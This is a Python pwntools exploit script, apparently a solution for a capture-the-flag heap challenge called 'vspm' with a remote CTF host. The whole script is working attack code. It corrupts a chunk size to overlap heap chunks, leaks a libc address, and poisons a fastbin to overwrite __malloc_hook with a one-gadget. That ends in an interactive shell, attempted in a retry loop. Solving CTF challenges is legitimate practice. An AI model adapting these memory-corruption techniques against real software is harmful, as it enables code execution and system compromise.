from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./vspm_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define allocs
    p *(char*[64]*)0x555555558060
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challs.tfcctf.com", port=30486)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")
# libddd = ELF("./libddd.so")

def exploit():
    def malloc(size, cred=b"\n", name=b"\n"):
        sla(b": ", b"1")
        sla(b"length: ", str(size).encode())
        sa(b"Enter credentials: ", cred)
        sleep(speed)
        sa(b"Name of the credentials: ", name)
        sleep(speed)
    def free(index):
        sla(b": ", b"3")
        sla(b"index: ", str(index).encode())
    def show():
        sla(b": ", b"2")
    def quit():
        sla(b"[+]> ", b"3")

    malloc(0)
    malloc(0x38)

    payload = flat({
        0x40: [
            0,
            0x21
        ]
    }) + b"\n"
    malloc(0x68, payload)

    free(0)

    payload = b"A"*0x18 + p8(0x91)
    malloc(0x18, payload)

    free(1)

    free(2)

    malloc(0x28, b"A", b"libc")
    show()
    leak = recvu(b"Input")
    libc.address = (u64(getb(leak, b"libc --> ", b"Input")) & ~0xff) - 0x3b4c00
    info("libc: %#018x" % libc.address)

    payload = flat([
        0,
        0x71,
        libc.sym["__malloc_hook"] - 0x1b - 8,
    ])
    malloc(0x18, payload)

    malloc(0x68)
    payload = b"A"*0x13 + p64(libc.address + 0xe1fa1)
    malloc(0x68, payload)

    sla(b": ", b"1")
    sla(b"length: ", b"1")

    io.interactive()
    input("end")
    exit()


while True:
    launch()
    try:
        exploit()
    except EOFError:
        pass
    try:
        print(io.recv(timeout=0.1))
    except:
        pass
    io.kill()
    sleep(0.5)
